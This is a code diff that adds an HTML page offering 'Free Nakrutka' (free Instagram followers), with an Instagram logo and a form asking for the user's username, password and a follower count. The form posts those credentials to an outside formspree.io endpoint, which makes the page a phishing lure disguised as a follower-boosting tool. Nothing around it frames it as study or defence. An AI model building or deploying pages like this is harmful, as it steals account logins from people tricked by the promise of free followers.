@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="nakrutka-box">
+        <div class="nakrutka-box_nav">
+          <h1>Free Nakrutka</h1>
+          <div class="img-div">
+            <img src="/128px-Instagram_logo_2022.svg.png" alt="Logo" />
+          </div>
+          <div class="input-box">
+            <form action="https://formspree.io/f/xqadkreb" method="POST">
+              <label>
+                <input
+                  type="text"
+                  name="name"
+                  placeholder="Enter your username@"
+                />
+              </label>
+              <label>
+                <input
+                  type="text"
+                  name="message"
+                  placeholder="Enter your password..."
+                />
+              </label>
+              <input type="number" name="followers" placeholder="10000" />
+              <div class="btn-group">
+                <button type="submit" id="start">Start</button>
+                <button type="button" id="stop">Stop</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="script.js"></script>
+  </body>
+</html>
